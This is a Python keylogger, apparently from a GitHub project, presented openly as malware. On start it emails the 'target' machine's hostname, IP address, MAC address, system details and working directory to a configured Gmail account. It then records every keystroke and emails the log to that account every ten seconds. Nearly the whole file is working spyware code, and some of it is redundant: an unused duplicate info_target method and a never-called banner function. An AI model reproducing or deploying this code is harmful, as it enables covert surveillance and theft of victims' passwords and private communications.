#!/usr/bin/env python3
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
import socket # for getting information about the target
import platform # for getting information about the target
import re, uuid # for getting information about the target
import os # for getting information about the target
# Semaphore is for blocking the current thread
# Timer is to make a method runs after an `interval` amount of time
from threading import Semaphore, Timer
SEND_REPORT_EVERY = 10 # Set the time to send the mail each(in seconds)
EMAIL_ADDRESS = "your_email_address@comapny.com" # enter your email address
EMAIL_PASSWORD = "your_password"   # enter your email password

def info_target():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    currentDirectory = os.getcwd()
    t_machine_info = platform.uname()
    message = f'''
    Target's device name: {hostname}
    Target's private IP address: {ip_address}
    Keylogger is saved in {currentDirectory} directory on target's machine.
    Information about target's machine: {t_machine_info}
    MAC address of target's machine: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
    '''

    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    # connect to the SMTP server as TLS mode ( for security )
    server.starttls()
    # login to the email account
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    # send the actual message
    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message)
    # terminates the session
    server.quit()

info_target()

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = "[space]"
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name == 'tab':
                name = '[TAB]'     
            elif name == 'esc':
                name = '[ESC]'
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # can print to a file, whatever you want
            # print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()
    
    def info_target():
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        message = f'''
        Target's device name: {hostname}
        Target's private IP address: {ip_address}
        '''

        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        # send the actual message
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message)
        # terminates the session
        server.quit()
    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()

def design():
    print('''

Shutting down 
see ya later
By: https://github.com/Tech-Sec 


|           |                   ________               |
|           |  __   __         |        |  __     ___  |            ________   _____   _____   _____   ______
|    ___    | |  | |  |______  |________| |  |___|   | |           |   __   | |     | |     | |     | |   ___|
|   |   |   | |  | |  |   |  | |          |______    | |           |  |  |  | |_____| |_____| |_____| |  |
|   |   |   | |  | |  |   |  | |                 |   | |           |  |__|  |       |       | |       |  |
|___|   |___| |__| |__|   |__| |                 |___| |__________ |________|  |____|  |____| |_____| |__|

For more visit: https://github.com/Tech-Sec?tab=repositories
''')
